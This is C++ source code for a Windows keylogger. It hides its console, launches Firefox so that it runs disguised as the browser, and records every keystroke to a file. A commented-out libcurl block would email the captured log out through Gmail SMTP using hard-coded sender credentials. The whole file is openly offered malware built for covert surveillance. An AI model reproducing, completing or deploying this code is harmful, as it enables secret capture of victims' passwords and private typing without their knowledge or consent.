#define _WIN32_WINNT 0x0501
#include <curl/curl.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <thread>
#include <iostream>
#include <tlhelp32.h>
#include <string>

/*
simple c+ keylogger
leave as is to save output to file
uncomment curl to send to specified email
specify process name and path to .exe which is going to be faked before compiling
Use c++ 11 standard, compiled & tested with mingw
Karol Szustakowski 2017
*/

char shitfield[]="PE  L ___f      à ! ! ! ! ! ! !";

char sender[] = "szustarol123@gmail.com";
char password[] = "password";
char processtofake[] = "firefox.exe";
char path[] = "C:\\Program Files\\Mozilla Firefox\\";

int send_mail(char msg[]) {
    std::ofstream ofs;
    ofs.open("tfile");
    ofs << msg;
    ofs.close();
    FILE *message;
    message = fopen("tfile", "ab+");
    /*CURL *curl;
    CURLcode curl_code;
    struct curl_slist *recipients= NULL;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME, sender);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
        curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
        recipients = curl_slist_append(recipients, '<' + sender + '>');
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, '<' + sender + '>');
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_READDATA, message);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        curl_code = curl_easy_perform(curl);

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }*/
    fclose(message);
   // std::remove("tfile");
    //return curl_code;
}

void pushstring(std::vector <char> &t, std::string input){
    for(int i = 0; i < input.length(); i++){
        t.push_back(input[i]);
    }
}

PROCESS_INFORMATION processInfo;
bool running;

void checkrunning(){
    while(true){
        if(WaitForSingleObject(processInfo.hProcess, 30) == WAIT_TIMEOUT)
            running = true;
        else{
            running = false;
            break;
        }
    }
}

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    bool shiftpressed = false;
    bool altpressed = false;
    int Charc;
    std::vector <char> chars;
    STARTUPINFO info;
    ZeroMemory(&info, sizeof(info));
    std::string temp = path;
    temp += processtofake;
    CreateProcess(temp.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &info, &processInfo);
    running = true;
    std::thread t1(checkrunning);
    while(running)
    {
        if(shiftpressed){
            if(!GetAsyncKeyState(VK_SHIFT)){
                pushstring(chars, "<SHIFTREL>");
                shiftpressed = false;
            }
        }
        if(altpressed){
            if(!(GetAsyncKeyState(VK_LMENU)) && !(GetAsyncKeyState(VK_RMENU))){
                pushstring(chars, "<ALTREL>");
                altpressed = false;
            }
        }
        for(Charc = 0x09; Charc < 0xDF; Charc++)
        {
            if(GetAsyncKeyState(Charc) & 0x0001){
                if(Charc >= 48 && Charc < 90){
                    if(Charc >= 65)
                        chars.push_back(Charc+32);
                    else
                        chars.push_back(Charc);
                    break;
                }
                else{
                    bool changed = false;
                    switch(Charc){
                        case VK_RETURN:
                            chars.push_back('\n');
                            changed = true;
                            break;
                        case VK_SPACE:
                            chars.push_back(' ');
                            changed = true;
                            break;
                        case VK_SHIFT:
                            if(!shiftpressed){
                                changed = true;
                                shiftpressed = true;
                                pushstring(chars, "<SHIFT>");
                            }
                            break;
                        case VK_LMENU:
                        case VK_RMENU:
                            if(!altpressed){
                                altpressed = true;
                                changed = true;
                                pushstring(chars, "<ALT>");
                            }
                            break;
                        case VK_TAB:
                            changed = true;
                            pushstring(chars, "<TAB>");
                            break;
                        case 0xBC:
                            changed = true;
                            chars.push_back(',');
                            break;
                        case 0xBE:
                            changed = true;
                            chars.push_back('.');
                            break;
                        case 0xBF:
                            changed = true;
                            chars.push_back('/');
                            break;
                        case 0xBA:
                            changed = true;
                            chars.push_back(';');
                            break;
                        case 0xDE:
                            changed = true;
                            chars.push_back('\'');
                            break;
                        case 0xDB:
                            changed = true;
                            chars.push_back('[');
                            break;
                        case 0xDD:
                            changed = true;
                            chars.push_back(']');
                            break;
                        case 0xBB:
                            changed = true;
                            chars.push_back('=');
                            break;
                        case 0xDC:
                            changed = true;
                            chars.push_back('\\');
                            break;
                        case 0xBD:
                            changed = true;
                            chars.push_back('-');
                            break;
                        case 0xC0:
                            changed = true;
                            chars.push_back('~');
                            break;
                    }
                    if(changed)
                        break;
                }
            }
        }
    }
    t1.join();
    char output[chars.size()];
    for(int i = 0; i < chars.size(); i++){
        output[i] = chars.at(i);
    }
    send_mail(output);
    return 0;
}
